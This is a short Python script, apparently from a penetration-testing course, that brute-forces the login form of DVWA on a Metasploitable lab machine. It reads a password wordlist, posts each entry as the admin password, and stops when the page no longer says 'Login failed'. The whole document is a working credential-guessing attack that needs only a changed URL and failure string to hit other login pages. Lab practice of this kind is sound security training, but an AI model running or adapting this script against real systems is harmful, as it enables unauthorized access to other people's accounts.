#!/usr/bin/env python

import requests

target = "http://10.0.2.7/dvwa/login.php" #from Metasploitable
data_dict = {"username":"admin","password":"password","Login":"submit"}
# response = requests.post(target, data=data_dict)
# print(response.content)

with open("/root/Downloads/Wordlists/passwords.txt", "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("Got the password: " + word)
            exit()

print("Reached end of line.")